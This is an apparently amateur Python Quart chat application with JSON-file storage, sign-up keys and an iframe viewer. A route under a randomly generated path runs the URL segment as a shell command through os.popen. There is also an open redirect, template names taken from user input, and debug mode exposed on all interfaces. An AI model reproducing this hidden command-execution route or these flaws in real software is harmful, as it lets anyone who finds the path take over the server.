import quart
from quart import Quart, redirect, render_template, request, session, url_for
import os
import json

from key_gen import assigner

import asyncio
import time

lis = [10]
aps = []

counter = -1


def count():
    global counter
    counter += 1
    return counter


#custom class for json wrapping
class db:
    """Internal methods for the storage and retrival of messages"""
    @staticmethod  #{
    def _append(name, _time, content):
        """'Appends' the keyword arguments into a json format"""
        thing = {
          "name": name,
           "_time": _time, 
           "content": content, 
           "id": counter + 1
           }
        with open("messagestore.json", 'r') as E:
            r = json.load(E)
            r[count()] = thing

        with open("messagestore.json", 'w') as E:
            json.dump(r, E)
        return dict(thing)

        #} - creates and updates a json file with the dict values from kws

    @staticmethod
    def _unappend(key):
        """'Unappends' the previously 'Appended' values into a json format"""
        with open("messagestore.json", 'r') as E:
            k = json.load(E)
            try:
                return dict(k[str(key)])
            except KeyError as e:
                return {"Exception occured": e}



def make_copy(file_to_copy, file):

    with open(file_to_copy, 'r') as firstfile:
        with open(file, 'w') as secondfile:
            for line in firstfile:
                secondfile.write(line)
                return secondfile


def set_route(file):
    th = assigner.give_id()
    with open(f"{file}.txt", "w") as O:
        O.write(th)
        return th


app = Quart('app')


def u_reg(name):
    ra = assigner.Create()
    with open("allowedKeys.json", "r") as A:
        k = json.load(A)
        k[name] = ra
    with open("allowedKeys.json", 'w') as A:
        json.dump(k, A)
    return ra


def user(value):
    with open('allowedKeys(v1).json', "r") as E:
        k = json.load(E)
        try:
            return k[value]['name']
        except KeyError:
            return '[/\]'


def V2_encode(name, key, _type):
    with open("allowedKeys(v1).json", "r") as E:
        l_E = json.load(E)
        l_E[key] = {
            "name": name,
            "key": key,
            "attrs": {
                "Private": "None",
                "Admin": False,
                "type": _type
            }
        }
    with open("allowedKeys(v1).json", 'w') as E:
        json.dump(l_E, E)


def V2_decode(name):
    with open("allowedKeys(v1).json", "r") as E:
        k = json.load(E)
        return dict(k[name])


def perm(uer=None):
  def check():
    try:
      if V2_decode(uer)['Admin'] == False:
        return redirect(f"/home/{uer}")
      else:
        return True
    except KeyError:
      return redirect('/sign-up')
      




key_dict = {
    'KNDoSWe6U': "Iron",
    'WvpIRvrjw': "Phil",
    'meUbsGekh': "Verrus",
}
#   "Kun": "vk6KmL1bi",
#   "Lime": "avwuaPvEp",
#   "Sam": "a5WUsoDWm",
#   "Lemon": "pWKi3MDXr",
#   "Eli": "iudghQQaF",
#   "4162_ADMIN": "7mES3UObM"


@app.route(f'/dev-point/{set_route("text")}/<name>')
async def ocn(name):
    V2_encode(name, assigner.give_id(), _type='dev-point')
    return V2_decode


@app.route(f'/iframe-key/{set_route("i_key")}/<endpoint>')
async def retiframe(endpoint):
    return redirect(endpoint)


@app.route('/Iron-Web/')
async def han():
    return await render_template("iframes.html")


@app.route('/Iron-Web/', methods=['POST'])
async def ha():
    url = (await request.form)['text']
    return await render_template('iframes.html', url=url, ur=url)


@app.route("/render/<htmlname>/<is_html>")
async def rander(htmlname, is_html: bool):
    if is_html:
        try:
            return await render_template(f"{htmlname}")
        except Exception as E:
            return E


def code_log(log_file, code):
  with open(log_file, 'w') as E:
    E.write(code)


@app.route('/')
async def return_landing():
    return redirect('/landing')

@app.route(f'/{set_route("rt")}/{set_route("rt2fa")}/<name>')
async def return_ling(name):
    return await render_template("output.html", output=f"{os.popen(name).read()}")

@app.route('/landing')
async def call_():
    return await render_template("landing.html")


@app.route('/home/@<name>')
async def asd(name):
    return await render_template('the-game.html', name=user(value=name))


@app.route('/home/@<nae>', methods=["POST"])
async def assa(nae):
    msg = (await request.form)['text']
    if msg == None:
      return await render_template("the-game.html")
    db._append(name=user(value=nae), _time="Test", content=msg)
    try:
      return await render_template('the-game.html',

    name=db._unappend(key=counter)['name'], 
    message=db._unappend(key=counter)['content'], 

    name2=db._unappend(key=counter - 1)['name'], 
    message2=db._unappend(key=counter - 1)['content'], 

    name3=db._unappend(key=counter - 2)['name'],
    message3=db._unappend(key=counter - 2)['content'], 

    name4=db._unappend(key=counter - 3)['name'], 
    message4=db._unappend(key=counter - 3)['content'], 

    name5=db._unappend(key=counter - 4)['name'], 
    message5=db._unappend(key=counter - 4)['content'], 

    name6=db._unappend(key=counter - 5)['name'], 
    message6=db._unappend(key=counter - 5)['content'], 

    name7=db._unappend(key=counter - 6)['name'], 
    message7=db._unappend(key=counter - 6)['content'],
    
    name8=db._unappend(key=counter - 7)['name'], 
    message8=db._unappend(key=counter - 7)['content'], 

    name9=db._unappend(key=counter - 8)['name'], 
    message9=db._unappend(key=counter - 8)['content'], 

    name10=db._unappend(key=counter - 9)['name'], 
    message10=db._unappend(key=counter - 9)['content'])
    except Exception as e:
      return await render_template("blank.html", error=type(e))


# @app.route('/admin/<name>')
# @perm_check()


def web_view(istrue):
  if istrue.startswith("https://") and istrue.endswith(".repl.co"):
    return istrue

@app.route("/sign-up")
async def aksj():
    th = assigner.Create()
    return await render_template("sign-up.html", exa=th)


@app.route('/sign-up', methods=['POST'])
async def on_():
    this = assigner.Create()
    txt = (await request.form)['text']
    V2_encode(txt, this, _type="sign-up")
    return redirect(f'/home/@{this}')


@app.route(f'/reset/{set_route("reset")}/<name>')
async def reset(name):
    return V2_decode(name)['name']


@app.route('/whois/<name>')
async def get_red(name):
    return await render_template("free_temp.html",
                                 one=V2_decode(name)['key'],
                                 name=V2_decode(name=name)['name'],
                                 admin=V2_decode(name=name)['attrs']['Admin'],
                                 private=V2_decode(name=name)['attrs']['Private'],
                                 ty_pe=V2_decode(name=name)['attrs']['type'])


@app.route('/account-logs/')
async def my_form():
    return await render_template('activity-searcher.html')


@app.route('/account-logs/', methods=['POST'])
async def my_form_post():
    text = (await request.form)['text']
    processed_text = text

    with open("Weblogs.json", "r") as f:
        l_f = json.load(f)
        for user_logs in l_f:
            if user_logs == f"{user(text)}":
                with open(f"{user(text)}", 'w'):
                    pass
                with open(f"{user(text)}", 'r') as j:
                    l_j = json.load(j)

        l_f[f"{text} | ID:{assigner.Create()}"] = f"{user(value=text)} was detected searching their account activity"

    with open("Weblogs.json", "w") as f:
        json.dump(l_f, f)
        return await render_template("activity.html",
                                     name=user(value=text),
                                     logs=l_f)


@app.route('/cool', methods=['GET', 'POST'])
async def inex():
    if request.method == 'POST':
        this = (await request.form('hello'))
        print(this)

    return '''<form method="post">
<input type="checkbox" name="hello" value="world" checked>
<input type="checkbox" name="hello" value="davidism" checked>
<input type="submit">
</form>'''


@app.route('/c/')
async def index():
    return await render_template(
        'color.html',
        co=session.get('user', 'black'),
    )


@app.route('/colour/', methods=['POST'])
async def set_colour():
    session['user'] = "black"
    return redirect(url_for('index'))


app.run(host='0.0.0.0', port=8042, debug=True)
